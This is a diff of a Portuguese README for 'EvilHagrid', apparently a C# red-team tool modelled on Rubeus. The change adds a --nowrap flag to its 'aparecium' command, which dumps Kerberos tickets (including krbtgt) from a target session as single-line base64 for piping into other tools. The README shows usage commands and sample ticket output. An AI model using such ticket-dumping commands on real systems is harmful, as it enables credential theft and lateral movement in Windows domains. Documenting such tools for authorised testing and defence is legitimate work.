@@ -6,7 +6,7 @@ EvilHagrid é uma reimplementação enxuta em C# de duas funcionalidades do [Rub
 
 ```
 EvilHagrid accio [--service <text>]
-EvilHagrid aparecium --luid <0x...> [--service <text>]
+EvilHagrid aparecium --luid <0x...> [--service <text>] [--nowrap]
 ```
 
 ### `accio` — enumerar tickets (triage)
@@ -42,14 +42,27 @@ PS> .\EvilHagrid.exe aparecium --luid 0x17b7e0 --service krbtgt
 
     Base64EncodedTicket :
 
-      doIFCDCCBQSgAwIBBaEMGwpDT1JQLkxPQ0FMoh8w...
+      doIFCDCCBQSgAwIBBaEMGwpDT1JQLkxPQ0FMoh8w
+      HaADAgECoRYwFBsGa3JidGd0GwpDT1JQLkxPQ0FM
+      ...
 
 [*] Dumped 1 ticket(s).
+```
+
+Com `--nowrap`, o base64 é impresso em uma única linha — útil para passar diretamente para outras ferramentas:
+
+```
+PS> .\EvilHagrid.exe aparecium --luid 0x17b7e0 --service krbtgt --nowrap
+
+    Base64EncodedTicket :
+
+      doIFCDCCBQSgAwIBBaEMGwpDT1JQLkxPQ0FMoh8wHaADAgECoRYwFBsGa3JidGd0GwpDT1JQLkxPQ0FM...
 ```
 
 **Opções:**
 - `--luid <0x...>` — LUID hexadecimal da sessão alvo (obrigatório)
 - `--service <text>` — filtra quais tickets da sessão serão dumpados
+- `--nowrap` — imprime o base64 em uma única linha (útil para pipar em outras ferramentas)
 
 ## Requisitos de privilégio
 
